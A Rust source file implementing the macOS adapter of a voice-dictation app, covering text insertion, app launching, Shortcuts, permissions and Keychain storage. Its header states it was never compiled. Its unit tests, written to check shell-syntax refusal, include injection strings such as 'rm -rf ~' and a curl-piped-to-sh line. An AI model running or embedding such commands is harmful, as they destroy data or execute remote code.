//! macOS implementation of [`PlatformIntegration`] and [`SecretStore`].
//!
//! Everything OS-specific for macOS lives here. The core sees only the trait
//! (spec §10).
//!
//! | Trait method | Mechanism |
//! |---|---|
//! | `active_application` | `NSWorkspace.frontmostApplication` → name, pid, bundle identifier |
//! | `restore_focus` | `NSRunningApplication.runningApplicationWithProcessIdentifier` → `activateWithOptions` |
//! | `is_secure_input` | `IsSecureEventInputEnabled` from Carbon |
//! | `insert_text` | clipboard paste with preservation, synthetic Unicode typing via `CGEventKeyboardSetUnicodeString`, or clipboard only |
//! | `clipboard` | `arboard` |
//! | `launch_application` | resolves a name against the application directories, then opens the bundle with `NSWorkspace.openURL` |
//! | `open_url` / `open_path` | validated by `airprompt_core::security`, then `NSWorkspace.openURL` |
//! | `list_shortcuts` / `run_shortcut` | `/usr/bin/shortcuts list` and `/usr/bin/shortcuts run`, argv only, never a shell |
//! | permissions | Accessibility via `AXIsProcessTrusted`; the microphone prompt is raised by the OS on first capture |
//! | `set_launch_at_login` | writes a LaunchAgent property list; the Tauri autostart plugin is preferred inside a bundle |
//! | `SecretStore` | Keychain via `keyring`, under the AirPrompt service name |
//!
//! ## Verification status — read this before trusting anything above
//!
//! **This file has never been compiled or executed.** It was written on a
//! Windows host with no macOS toolchain. It is compiled by
//! `.github/workflows/test.yml` on a `macos-latest` runner; until that run has
//! happened and passed, treat every method as *written, unproven*. This is
//! stated in `RELEASE_READINESS.md` and must not be softened.
//!
//! ## Deliberately not implemented
//!
//! * **Audio devices and capture** — `Unsupported`, with a message the UI shows.
//!   Capture needs an audio backend (`cpal`/CoreAudio) that is not a dependency.
//! * **Microphone permission *query*** — reading it needs the AVFoundation
//!   Objective-C bindings; macOS raises the prompt on the first capture attempt,
//!   and `open_permission_settings` opens the exact Privacy pane.
//! * **Window titles and the text before the caret** — both need Accessibility
//!   (`AXUIElement`) bindings, so they are reported as unavailable rather than
//!   guessed. Continuous dictation therefore reports it cannot read the target
//!   field instead of inventing a value.
//!
//! ## Security posture
//!
//! * No shell is ever involved: `shortcuts` is run with `argv` only, and the
//!   binary path is absolute and fixed.
//! * A spoken application name is matched against the bundles actually present
//!   in the application directories; an unmatched name is refused rather than
//!   handed to the system to interpret.
//! * Shell syntax in any target is refused before an open call.
//! * `insert_text` refuses to type into AirPrompt's own windows.

use airprompt_core::error::{Error, Result};
use airprompt_core::identity;
use airprompt_core::platform::{
    ActiveApplication, InputDevice, InsertMode, InsertOutcome, PermissionKind, PermissionState,
    PermissionStatus, PlatformIntegration, SecretStore,
};
use airprompt_core::security::{self, ActionKind, Verdict};

use std::path::{Path, PathBuf};
use std::process::Command;

use objc2_app_kit::{NSApplicationActivationOptions, NSWorkspace};
use objc2_foundation::{NSString, NSURL};

/* ------------------------------------------------------------------ FFI --- */

// The C entry points used here are declared locally rather than pulled in from
// another crate: the surface is then exactly what this file uses, and the
// Unicode-typing and secure-input calls are stable C APIs that have not changed
// in a decade.

type CFTypeRef = *const std::ffi::c_void;
type CGEventRef = *mut std::ffi::c_void;

#[link(name = "ApplicationServices", kind = "framework")]
extern "C" {
    /// True when the process is trusted for Accessibility (the permission text
    /// injection needs).
    fn AXIsProcessTrusted() -> u8;
    fn CGEventCreateKeyboardEvent(
        source: CFTypeRef,
        virtual_key: u16,
        key_down: bool,
    ) -> CGEventRef;
    fn CGEventKeyboardSetUnicodeString(event: CGEventRef, length: usize, string: *const u16);
    fn CGEventSetFlags(event: CGEventRef, flags: u64);
    fn CGEventPost(tap: u32, event: CGEventRef);
    /// Whether this process may post synthetic events — the check that matters
    /// for text injection on modern macOS.
    fn CGPreflightPostEventAccess() -> u8;
    /// Whether this process may listen to events, which is what the global
    /// hotkey needs.
    fn CGPreflightListenEventAccess() -> u8;
}

#[link(name = "Carbon", kind = "framework")]
extern "C" {
    /// True while secure event input is enabled — a password prompt, or a
    /// password field that has taken exclusive keyboard access.
    fn IsSecureEventInputEnabled() -> u8;
}

#[link(name = "CoreFoundation", kind = "framework")]
extern "C" {
    fn CFRelease(value: CFTypeRef);
}

/// `kCGHIDEventTap`: events go to the session as if typed.
const HID_EVENT_TAP: u32 = 0;
/// Virtual keycode for `V` (`kVK_ANSI_V`).
const KEYCODE_V: u16 = 9;
/// `kCGEventFlagMaskCommand`.
const FLAG_COMMAND: u64 = 1 << 20;

/// Applications that exist only to run other things. Refused by name so a
/// spoken "open Terminal" cannot be mistaken for a dictation target (spec §25).
const REFUSED_BUNDLES: &[&str] = &["Script Editor", "Automator", "Terminal", "iTerm", "iTerm2"];

/* -------------------------------------------------------------- helpers --- */

/// Where macOS keeps applications, in the order a user would look.
fn application_directories() -> Vec<PathBuf> {
    let mut directories = vec![
        PathBuf::from("/Applications"),
        PathBuf::from("/System/Applications"),
        PathBuf::from("/System/Applications/Utilities"),
        PathBuf::from("/Applications/Utilities"),
    ];

    if let Some(home) = dirs::home_dir() {
        directories.push(home.join("Applications"));
    }

    directories
}

/// Every installed application bundle, as `(display name, path)`.
///
/// Only the top level of each directory is read: the bundle *directory* is the
/// application, so recursion would just walk inside other people's packages.
fn installed_bundles() -> Vec<(String, PathBuf)> {
    let mut bundles = Vec::new();

    for directory in application_directories() {
        let Ok(entries) = std::fs::read_dir(&directory) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_dir() {
                continue;
            }
            let is_bundle = path
                .extension()
                .map(|extension| extension.eq_ignore_ascii_case("app"))
                .unwrap_or(false);
            if !is_bundle {
                continue;
            }
            if let Some(name) = path.file_stem() {
                let name = name.to_string_lossy().into_owned();
                if !REFUSED_BUNDLES
                    .iter()
                    .any(|refused| normalize_name(refused) == normalize_name(&name))
                {
                    bundles.push((name, path));
                }
            }
        }
    }

    bundles.sort();
    bundles.dedup();
    bundles
}

/// Normalise a spoken name for comparison: case, punctuation and `.app` are all
/// noise to a person talking.
fn normalize_name(value: &str) -> String {
    value
        .trim()
        .trim_end_matches(".app")
        .chars()
        .filter(|c| c.is_alphanumeric() || c.is_whitespace())
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
}

/// Resolve a spoken application name to a bundle on disk.
///
/// Exact match first, then a unique substring match. An ambiguous name resolves
/// to nothing, and the caller tells the user — silently choosing between three
/// similarly named applications is exactly the assumption the specification
/// forbids (spec §27).
fn resolve_application(name: &str) -> Option<PathBuf> {
    let wanted = normalize_name(name);
    if wanted.is_empty() {
        return None;
    }

    let bundles = installed_bundles();

    for (display, path) in &bundles {
        if normalize_name(display) == wanted {
            return Some(path.clone());
        }
    }

    let mut matches: Vec<PathBuf> = bundles
        .iter()
        .filter(|(display, _)| {
            let candidate = normalize_name(display);
            candidate.contains(&wanted) || wanted.contains(&candidate)
        })
        .map(|(_, path)| path.clone())
        .collect();

    matches.sort();
    matches.dedup();
    if matches.len() == 1 {
        matches.pop()
    } else {
        None
    }
}

/// Validate a Shortcut name before it is passed to `/usr/bin/shortcuts`.
///
/// The argument is passed through `argv`, never a shell, but a name that looks
/// like shell syntax is refused anyway: a voice command that reaches the
/// Shortcuts tool should be a name, and nothing else.
fn validate_shortcut_name(name: &str) -> Result<String> {
    let trimmed = name.trim();
    if trimmed.is_empty() {
        return Err(Error::Refused("no Shortcut was named".into()));
    }
    if trimmed.chars().count() > 120 {
        return Err(Error::Refused("that Shortcut name was too long".into()));
    }
    if trimmed.chars().any(|c| c.is_control()) {
        return Err(Error::Refused(
            "that Shortcut name contained control characters".into(),
        ));
    }
    if trimmed.starts_with('-') {
        // Otherwise a Shortcut named "--help" would be read as a flag.
        return Err(Error::Refused(
            "that Shortcut name would be read as an option".into(),
        ));
    }
    if security::looks_like_shell(trimmed) {
        return Err(Error::Refused(
            "that looks like a command line, not a Shortcut name".into(),
        ));
    }

    Ok(trimmed.to_string())
}

/// The LaunchAgent property list used for "open at login" outside a bundle.
fn launch_agent_path() -> Option<PathBuf> {
    dirs::home_dir().map(|home| {
        home.join("Library")
            .join("LaunchAgents")
            .join(format!("{}.plist", identity::APP_IDENTIFIER))
    })
}

/// The property list contents. Written by hand: it is a fixed, tiny document,
/// and a serialisation dependency for six lines would be worse than the six
/// lines.
fn launch_agent_plist(executable: &Path) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{program}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"#,
        label = identity::APP_IDENTIFIER,
        program = executable.display()
    )
}

/// A Rust string as an `NSString`.
fn nsstring(value: &str) -> objc2::rc::Retained<NSString> {
    NSString::from_str(value)
}

/// The macOS platform adapter.
///
/// Stateless: every call reads the current state of the session, so nothing can
/// fall out of sync after a fast user switch or a display change.
pub struct MacOsIntegration;

impl MacOsIntegration {
    pub fn new() -> Self {
        MacOsIntegration
    }
}

impl Default for MacOsIntegration {
    fn default() -> Self {
        Self::new()
    }
}

/* ----------------------------------------------------- synthetic input --- */

/// Pause after a synthetic paste, before the clipboard is restored.
const PASTE_SETTLE_MS: u64 = 140;

/// Type text by posting synthetic Unicode key events.
///
/// Each event carries a run of characters, which is far cheaper than one event
/// per character and is the documented way to type text that is not on the
/// current keyboard layout.
fn type_unicode(text: &str) -> Result<()> {
    const RUN: usize = 64;

    let characters: Vec<char> = text.chars().collect();
    if characters.len() > 20_000 {
        return Err(Error::Insertion(
            "that much text cannot be typed safely; it is on the clipboard instead".into(),
        ));
    }

    for chunk in characters.chunks(RUN) {
        let run: String = chunk.iter().collect();
        let units: Vec<u16> = run.encode_utf16().collect();

        unsafe {
            let event = CGEventCreateKeyboardEvent(std::ptr::null(), 0, true);
            if event.is_null() {
                return Err(Error::Insertion(
                    "the keystrokes were blocked; the transcript is on the clipboard".into(),
                ));
            }
            CGEventKeyboardSetUnicodeString(event, units.len(), units.as_ptr());
            CGEventPost(HID_EVENT_TAP, event);
            CFRelease(event as CFTypeRef);
        }
    }

    Ok(())
}

/// Post ⌘V.
fn send_command_v() -> bool {
    unsafe {
        let down = CGEventCreateKeyboardEvent(std::ptr::null(), KEYCODE_V, true);
        let up = CGEventCreateKeyboardEvent(std::ptr::null(), KEYCODE_V, false);

        if down.is_null() || up.is_null() {
            if !down.is_null() {
                CFRelease(down as CFTypeRef);
            }
            if !up.is_null() {
                CFRelease(up as CFTypeRef);
            }
            return false;
        }

        CGEventSetFlags(down, FLAG_COMMAND);
        CGEventSetFlags(up, FLAG_COMMAND);
        CGEventPost(HID_EVENT_TAP, down);
        CGEventPost(HID_EVENT_TAP, up);
        CFRelease(down as CFTypeRef);
        CFRelease(up as CFTypeRef);
    }

    std::thread::sleep(std::time::Duration::from_millis(PASTE_SETTLE_MS));
    true
}

/* ------------------------------------------------------------ clipboard --- */

fn clipboard() -> Result<arboard::Clipboard> {
    arboard::Clipboard::new()
        .map_err(|error| Error::Clipboard(format!("the clipboard is unavailable: {error}")))
}

fn read_clipboard_text() -> Option<String> {
    clipboard().ok()?.get_text().ok()
}

fn set_clipboard_text(text: &str) -> Result<()> {
    clipboard()?
        .set_text(text)
        .map_err(|error| Error::Clipboard(format!("the clipboard could not be updated: {error}")))
}

/* ------------------------------------------------------------- opening --- */

/// Open a path with the default application, through Launch Services.
fn open_at_url(url: &NSURL) -> Result<()> {
    let workspace = unsafe { NSWorkspace::sharedWorkspace() };
    if unsafe { workspace.openURL(url) } {
        Ok(())
    } else {
        Err(Error::Refused("macOS would not open that item".into()))
    }
}

fn open_string(target: &str) -> Result<()> {
    let url = NSURL::URLWithString(&nsstring(target))
        .ok_or_else(|| Error::Refused("that address could not be understood".into()))?;
    open_at_url(&url)
}

/// Open a file or folder on disk.
fn open_file_url(path: &Path) -> Result<()> {
    let url = NSURL::fileURLWithPath(&nsstring(&path.to_string_lossy()));
    open_at_url(&url)
}

/// Open one of macOS' own settings panes. The URI is a constant in this file,
/// never user input, which is why it bypasses the http(s) URL validator.
fn open_system_pane(uri: &str) -> Result<()> {
    open_string(uri)
}

/* --------------------------------------------------------- shortcuts app --- */

/// Names of the user's Shortcuts, straight from the system tool.
fn list_shortcuts() -> Result<Vec<String>> {
    let output = Command::new("/usr/bin/shortcuts")
        .arg("list")
        .output()
        .map_err(|error| Error::Io(format!("the Shortcuts tool is unavailable: {error}")))?;

    if !output.status.success() {
        return Err(Error::Io(
            "the Shortcuts tool refused to list the library".into(),
        ));
    }

    let mut names: Vec<String> = String::from_utf8_lossy(&output.stdout)
        .lines()
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect();

    names.sort();
    names.dedup();
    Ok(names)
}

/// Run a Shortcut by name. `argv` only — no shell, ever.
fn run_shortcut(name: &str) -> Result<()> {
    let name = validate_shortcut_name(name)?;

    if let Verdict::Blocked(reason) = security::judge(ActionKind::RunShortcut, &name) {
        return Err(Error::Refused(reason.to_string()));
    }

    let status = Command::new("/usr/bin/shortcuts")
        .arg("run")
        .arg(&name)
        .status()
        .map_err(|error| Error::Io(format!("the Shortcuts tool is unavailable: {error}")))?;

    if status.success() {
        Ok(())
    } else {
        Err(Error::Refused(format!(
            "the Shortcut \"{name}\" could not be run; check that it still exists"
        )))
    }
}

/* ------------------------------------------------- permission inspection --- */

/// Whether synthetic events may be posted: the permission text injection needs.
fn post_event_access() -> PermissionState {
    let trusted = unsafe { AXIsProcessTrusted() } != 0;
    let post = unsafe { CGPreflightPostEventAccess() } != 0;

    if trusted && post {
        PermissionState::Granted
    } else {
        PermissionState::Denied
    }
}

/// Whether keyboard events may be observed: the permission the global hotkey
/// needs when it is implemented with an event tap rather than a registered
/// shortcut.
fn listen_event_access() -> PermissionState {
    if unsafe { CGPreflightListenEventAccess() } != 0 {
        PermissionState::Granted
    } else {
        PermissionState::Denied
    }
}

/* ------------------------------------------------------- integration --- */

impl PlatformIntegration for MacOsIntegration {
    fn platform_name(&self) -> &'static str {
        "macos"
    }

    fn arch(&self) -> &'static str {
        std::env::consts::ARCH
    }

    fn active_application(&self) -> Result<ActiveApplication> {
        let workspace = unsafe { NSWorkspace::sharedWorkspace() };
        let frontmost = unsafe { workspace.frontmostApplication() };

        let Some(application) = frontmost else {
            return Err(Error::Unsupported(
                "no application had focus; nothing to dictate into".into(),
            ));
        };

        let name = unsafe { application.localizedName() }
            .map(|name| name.to_string())
            .unwrap_or_default();
        let identifier = unsafe { application.bundleIdentifier() }.map(|id| id.to_string());
        let pid = unsafe { application.processIdentifier() };

        Ok(ActiveApplication {
            name,
            pid: u32::try_from(pid).ok(),
            identifier,
            // The window title and the text before the caret both need the
            // Accessibility API; reporting nothing is the documented contract
            // for a platform that cannot read them.
            window_title: None,
            preceding_text: String::new(),
        })
    }

    fn restore_focus(&self, app: &ActiveApplication) -> Result<()> {
        let Some(pid) = app.pid else {
            return Err(Error::TargetGone);
        };

        let running =
            unsafe { NSRunningApplication::runningApplicationWithProcessIdentifier(pid as i32) };

        let Some(running) = running else {
            return Err(Error::TargetGone);
        };

        // `NSApplicationActivateIgnoringOtherApps`, written as its documented
        // raw value: the constant was renamed across SDK versions, the bit was
        // not.
        let options = NSApplicationActivationOptions(1 << 1);

        if unsafe { running.activateWithOptions(options) } {
            Ok(())
        } else {
            Err(Error::TargetGone)
        }
    }

    fn is_secure_input(&self) -> bool {
        unsafe { IsSecureEventInputEnabled() != 0 }
    }

    fn insert_text(&self, text: &str, mode: InsertMode) -> Result<InsertOutcome> {
        if text.is_empty() {
            return Err(Error::Insertion("there was nothing to insert".into()));
        }

        // Never type into our own windows.
        let workspace = unsafe { NSWorkspace::sharedWorkspace() };
        if let Some(frontmost) = unsafe { workspace.frontmostApplication() } {
            if unsafe { frontmost.processIdentifier() } as u32 == std::process::id() {
                return Err(Error::Insertion(
                    "AirPrompt had focus, so the text was left on the clipboard".into(),
                ));
            }
        }

        match mode {
            InsertMode::ClipboardOnly => {
                set_clipboard_text(text)?;
                Ok(InsertOutcome::CopiedOnly)
            }
            InsertMode::Type => {
                type_unicode(text)?;
                Ok(InsertOutcome::Inserted)
            }
            InsertMode::Paste => {
                // A clipboard holding an image, files or rich content must not
                // be destroyed for our convenience: `arboard` can only restore
                // text, so when there is no text to save the direct-typing path
                // is used instead.
                let previous = match read_clipboard_text() {
                    Some(previous) => Some(previous),
                    None => {
                        type_unicode(text)?;
                        return Ok(InsertOutcome::Inserted);
                    }
                };

                set_clipboard_text(text)?;
                let pasted = send_command_v();

                if let Some(previous) = previous {
                    if let Err(error) = set_clipboard_text(&previous) {
                        // Explicit outcome: the transcript is still on the
                        // clipboard, which is the user's fallback, and the
                        // failure is reported instead of swallowed.
                        tracing::warn!(
                            code = error.code(),
                            "the previous clipboard contents could not be restored; the transcript remains on the clipboard"
                        );
                        return Ok(InsertOutcome::Inserted);
                    }
                }

                if !pasted {
                    return Err(Error::Insertion(
                        "the paste keystroke was blocked; the transcript is on the clipboard"
                            .into(),
                    ));
                }

                Ok(InsertOutcome::Inserted)
            }
        }
    }

    fn set_clipboard(&self, text: &str) -> Result<Option<String>> {
        let previous = read_clipboard_text();
        set_clipboard_text(text)?;
        Ok(previous)
    }

    fn clipboard(&self) -> Result<String> {
        read_clipboard_text().ok_or_else(|| Error::Clipboard("the clipboard held no text".into()))
    }

    fn launch_application(&self, name: &str) -> Result<()> {
        let name = name.trim();
        if name.is_empty() {
            return Err(Error::Refused("no application was named".into()));
        }
        if name.chars().count() > 120 {
            return Err(Error::Refused("that name was too long".into()));
        }
        if name.contains(['/', '\n', '\r', '\t']) {
            return Err(Error::Refused(
                "application names cannot contain path separators".into(),
            ));
        }
        if security::looks_like_shell(name) {
            return Err(Error::Refused(
                "that looks like a command line, not an application name".into(),
            ));
        }
        if let Verdict::Blocked(reason) = security::judge(ActionKind::OpenApp, name) {
            return Err(Error::Refused(reason.to_string()));
        }

        let Some(bundle) = resolve_application(name) else {
            // Refused, not guessed (spec §26, §27).
            return Err(Error::Refused(format!(
                "no installed application matched \"{name}\""
            )));
        };

        open_file_url(&bundle)
    }

    fn open_url(&self, url: &str) -> Result<()> {
        let normalized = security::validate_url(url)?;
        if let Verdict::Blocked(reason) = security::judge(ActionKind::OpenUrl, &normalized) {
            return Err(Error::Refused(reason.to_string()));
        }
        open_string(&normalized)
    }

    fn open_path(&self, path: &str) -> Result<()> {
        let validated = security::validate_path(path)?;
        let path = PathBuf::from(validated);

        if !path.exists() {
            return Err(Error::Refused("that file or folder does not exist".into()));
        }
        if let Verdict::Blocked(reason) =
            security::judge(ActionKind::OpenFolder, &path.to_string_lossy())
        {
            return Err(Error::Refused(reason.to_string()));
        }

        open_file_url(&path)
    }

    fn list_shortcuts(&self) -> Result<Vec<String>> {
        list_shortcuts()
    }

    fn run_shortcut(&self, name: &str) -> Result<()> {
        run_shortcut(name)
    }

    fn installed_applications(&self) -> Result<Vec<String>> {
        let mut names: Vec<String> = installed_bundles()
            .into_iter()
            .map(|(name, _)| name)
            .collect();
        names.sort();
        names.dedup();
        Ok(names)
    }

    fn permission_status(&self) -> PermissionStatus {
        PermissionStatus {
            // Reading the microphone permission needs the AVFoundation
            // bindings, which are not wired yet. macOS raises the prompt by
            // itself on the first capture attempt, so reporting "not yet
            // determined" is accurate rather than evasive.
            microphone: PermissionState::NotDetermined,
            accessibility: post_event_access(),
            input_monitoring: listen_event_access(),
        }
    }

    fn request_permission(&self, kind: PermissionKind) -> Result<PermissionStatus> {
        // macOS grants these only in System Settings, so the honest action is to
        // take the user there and re-read the state afterwards.
        self.open_permission_settings(kind)?;
        Ok(self.permission_status())
    }

    fn open_permission_settings(&self, kind: PermissionKind) -> Result<()> {
        match kind {
            PermissionKind::Microphone => open_system_pane(
                "x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone",
            ),
            PermissionKind::Accessibility => open_system_pane(
                "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility",
            ),
            PermissionKind::InputMonitoring => open_system_pane(
                "x-apple.systempreferences:com.apple.preference.security?Privacy_ListenEvent",
            ),
        }
    }

    fn input_devices(&self) -> Result<Vec<InputDevice>> {
        Err(Error::Unsupported(
            "microphone selection is not implemented on macOS yet".into(),
        ))
    }

    fn default_input_device(&self) -> Result<Option<String>> {
        Err(Error::Unsupported(
            "microphone selection is not implemented on macOS yet".into(),
        ))
    }

    fn set_launch_at_login(&self, enabled: bool) -> Result<()> {
        let Some(path) = launch_agent_path() else {
            return Err(Error::Io("the home directory could not be located".into()));
        };

        if !enabled {
            return match std::fs::remove_file(&path) {
                Ok(()) => Ok(()),
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
                Err(error) => Err(Error::Io(format!(
                    "the login item could not be removed: {error}"
                ))),
            };
        }

        let executable = std::env::current_exe()
            .map_err(|error| Error::Io(format!("could not locate the application: {error}")))?;

        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)
                .map_err(|error| Error::Io(format!("could not create {parent:?}: {error}")))?;
        }

        std::fs::write(&path, launch_agent_plist(&executable))
            .map_err(|error| Error::Io(format!("the login item could not be written: {error}")))
    }

    fn launch_at_login(&self) -> Result<bool> {
        let Some(path) = launch_agent_path() else {
            return Ok(false);
        };
        let Ok(contents) = std::fs::read_to_string(&path) else {
            return Ok(false);
        };
        let Ok(executable) = std::env::current_exe() else {
            return Ok(false);
        };

        // The entry counts only when it still points at this executable, so a
        // stale item from a moved installation reads as off.
        Ok(contents.contains(&executable.to_string_lossy().to_string()))
    }

    /// `sysctl -n hw.memsize`, which every supported macOS version answers.
    ///
    /// The alternative is an `NSProcessInfo.physicalMemory` binding, which
    /// needs another objc2 feature for one integer; this is the smaller
    /// dependency. `argv` only, and the path is the system's own.
    fn total_memory_mb(&self) -> Option<u64> {
        let output = Command::new("/usr/sbin/sysctl")
            .arg("-n")
            .arg("hw.memsize")
            .output()
            .ok()?;
        if !output.status.success() {
            return None;
        }
        let bytes: u64 = String::from_utf8_lossy(&output.stdout)
            .trim()
            .parse()
            .ok()?;
        Some(bytes / (1024 * 1024))
    }

    /// `df -k` on the volume containing `path`, which also walks up to an
    /// existing ancestor so a not-yet-created models directory still answers.
    fn free_disk_mb(&self, path: &Path) -> Option<u64> {
        let mut probe = path;
        while !probe.exists() {
            probe = probe.parent()?;
        }

        let output = Command::new("/bin/df").arg("-k").arg(probe).output().ok()?;
        if !output.status.success() {
            return None;
        }

        // `df -k` prints a header then one row of whitespace-separated fields;
        // column 4 is KiB available on every macOS release.
        let text = String::from_utf8_lossy(&output.stdout);
        let available: u64 = text
            .lines()
            .nth(1)?
            .split_whitespace()
            .nth(3)?
            .parse()
            .ok()?;
        Some(available / 1024)
    }
}

/* ------------------------------------------------------------- secrets --- */

/// API keys in the login keychain.
///
/// The service name comes from the product identity, and a key written by an
/// earlier build is migrated on first read (spec §11, §33). The old entry is
/// left in place: a failed migration must not cost the user their key.
pub struct MacOsSecretStore;

impl MacOsSecretStore {
    pub fn new() -> Self {
        MacOsSecretStore
    }
}

impl Default for MacOsSecretStore {
    fn default() -> Self {
        Self::new()
    }
}

impl SecretStore for MacOsSecretStore {
    fn set(&self, key: &str, value: &str) -> Result<()> {
        let entry = keyring::Entry::new(identity::SECRET_SERVICE, key)
            .map_err(|error| Error::Store(format!("the keychain rejected the entry: {error}")))?;
        entry
            .set_password(value)
            .map_err(|error| Error::Store(format!("the key could not be stored: {error}")))
    }

    fn get(&self, key: &str) -> Result<Option<String>> {
        let entry = keyring::Entry::new(identity::SECRET_SERVICE, key)
            .map_err(|error| Error::Store(format!("the keychain rejected the entry: {error}")))?;

        match entry.get_password() {
            Ok(value) => Ok(Some(value)),
            Err(keyring::Error::NoEntry) => migrate_legacy_key(key),
            Err(error) => Err(Error::Store(format!(
                "the stored key could not be read: {error}"
            ))),
        }
    }

    fn delete(&self, key: &str) -> Result<()> {
        let entry = keyring::Entry::new(identity::SECRET_SERVICE, key)
            .map_err(|error| Error::Store(format!("the keychain rejected the entry: {error}")))?;

        match entry.delete_credential() {
            Ok(()) | Err(keyring::Error::NoEntry) => Ok(()),
            Err(error) => Err(Error::Store(format!(
                "the stored key could not be removed: {error}"
            ))),
        }
    }
}

/// Read a key from an earlier service name and copy it forward.
fn migrate_legacy_key(key: &str) -> Result<Option<String>> {
    for service in identity::LEGACY_SECRET_SERVICES {
        let Ok(entry) = keyring::Entry::new(service, key) else {
            continue;
        };
        let Ok(value) = entry.get_password() else {
            continue;
        };

        if let Ok(current) = keyring::Entry::new(identity::SECRET_SERVICE, key) {
            if let Err(error) = current.set_password(&value) {
                tracing::warn!(
                    "a stored key was found under an earlier name but could not be copied forward: {error}"
                );
            }
        }

        tracing::info!("migrated a stored key from an earlier keychain service name");
        return Ok(Some(value));
    }

    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_normalise_the_way_people_say_them() {
        assert_eq!(normalize_name("Visual Studio Code"), "visual studio code");
        assert_eq!(normalize_name("  Safari.app "), "safari");
        assert_eq!(normalize_name("Google   Chrome"), "google chrome");
        assert_eq!(normalize_name(""), "");
    }

    #[test]
    fn shell_syntax_is_recognised_in_an_application_name() {
        for hostile in [
            "Safari && rm -rf ~",
            "Finder; curl http://example.com | sh",
            "Notes $(whoami)",
            "Terminal `id`",
        ] {
            assert!(
                security::looks_like_shell(hostile),
                "{hostile} must be recognisable as shell syntax"
            );
        }
    }

    #[test]
    fn shortcut_names_are_validated_before_they_reach_the_tool() {
        assert_eq!(
            validate_shortcut_name("  Start Coding ").unwrap(),
            "Start Coding"
        );

        assert!(validate_shortcut_name("").is_err());
        assert!(validate_shortcut_name("   ").is_err());
        assert!(validate_shortcut_name("--help").is_err());
        assert!(validate_shortcut_name("Start\nCoding").is_err());
        assert!(validate_shortcut_name("Start && rm -rf /").is_err());
        assert!(validate_shortcut_name(&"x".repeat(200)).is_err());
    }

    #[test]
    fn the_launch_agent_is_named_after_the_product_identifier() {
        let path = launch_agent_path().expect("a home directory");
        assert!(path.to_string_lossy().contains("LaunchAgents"));
        assert!(path.to_string_lossy().contains(identity::APP_IDENTIFIER));
    }

    #[test]
    fn the_launch_agent_plist_is_well_formed() {
        let plist = launch_agent_plist(Path::new(
            "/Applications/AirPrompt.app/Contents/MacOS/airprompt",
        ));
        assert!(plist.starts_with("<?xml version=\"1.0\""));
        assert!(plist.contains("<key>RunAtLoad</key>"));
        assert!(plist.contains("<true/>"));
        assert!(plist.contains(identity::APP_IDENTIFIER));
        assert!(plist.contains("/Applications/AirPrompt.app/Contents/MacOS/airprompt"));
        assert_eq!(plist.matches("<key>Label</key>").count(), 1);
    }

    #[test]
    fn refused_bundles_are_excluded_from_the_application_list() {
        // The list is built from disk, so this asserts the rule rather than the
        // machine's contents.
        for refused in REFUSED_BUNDLES {
            let normalized = normalize_name(refused);
            assert!(!normalized.is_empty());
            assert!(
                REFUSED_BUNDLES
                    .iter()
                    .any(|candidate| normalize_name(candidate) == normalized),
                "{refused} must be refused by name"
            );
        }
    }
}
